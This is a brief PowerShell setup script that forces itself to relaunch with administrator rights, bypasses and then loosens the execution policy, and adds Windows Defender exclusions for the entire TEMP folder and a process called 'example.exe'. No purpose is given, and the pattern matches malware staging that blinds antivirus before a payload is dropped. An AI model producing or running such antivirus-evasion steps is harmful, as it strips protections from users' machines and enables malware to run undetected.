# # FIRST THINGS FIRST

# Check if the script is running with elevated privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Relaunch the script with elevated privileges
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Set the execution policy
Set-ExecutionPolicy RemoteSigned -Force

# Add Exlusion in Windows Defender
Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"